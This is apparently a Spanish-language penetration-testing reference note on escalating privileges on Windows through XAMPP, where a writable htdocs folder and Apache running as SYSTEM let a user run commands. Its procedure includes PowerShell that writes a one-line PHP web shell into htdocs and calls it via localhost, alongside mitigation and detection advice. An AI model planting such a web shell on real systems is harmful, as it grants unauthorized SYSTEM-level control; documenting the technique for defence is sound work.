---
topic: XAMPP privilege escalation
tags: [windows, xampp, apache, webshell, htdocs, system]
---

# XAMPP privilege escalation

[🌐 English](xampp-privesc.en.md) | **Español**

## Concepto

XAMPP instala Apache y PHP para desarrollo, a menudo con `htdocs` escribible y el servicio ejecutándose como `NT AUTHORITY\SYSTEM`. Si un usuario puede escribir en `C:\xampp\htdocs`, puede colocar un PHP y solicitar `http://localhost` para ejecutar comandos con los privilegios del servicio.

## Cuándo aplica

- XAMPP instalado en el host.
- Apache ejecutado como SYSTEM.
- `htdocs` con permisos de escritura para usuarios.
- PHP habilitado y accesible localmente.

## Procedimiento

1. Localizar la instalación y el directorio `htdocs`.
2. Revisar permisos con `icacls`.
3. Comprobar la identidad del servicio Apache.
4. Escribir un PHP con `system`.
5. Solicitarlo por `localhost` y verificar la identidad.

```powershell
icacls C:\xampp\htdocs
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select Name,StartName
'<?php system($_GET["c"]); ?>' | Set-Content C:\xampp\htdocs\sh.php
curl.exe -k "https://localhost/sh.php?c=whoami"
```

## Variantes

- `htdocs` escribible por `BUILTIN\Users`.
- Apache como SYSTEM o una cuenta de servicio privilegiada.
- PHP con `disable_functions` vacío.
- Uso de un virtual host o alias adicional.

## Limitaciones

- El servicio debe estar en ejecución.
- El firewall puede bloquear el puerto.
- `htdocs` puede no ser escribible.
- PHP puede estar deshabilitado o restringido.

## Mitigación y detección

- No ejecutar Apache como SYSTEM.
- Restringir permisos de `htdocs`.
- Deshabilitar funciones peligrosas y retirar XAMPP de producción.
- Alertar de archivos PHP nuevos y peticiones a `localhost`.

## Referencias

- <https://www.apachefriends.org/docs/>
- <https://attack.mitre.org/techniques/T1505/003/>
- <https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload>
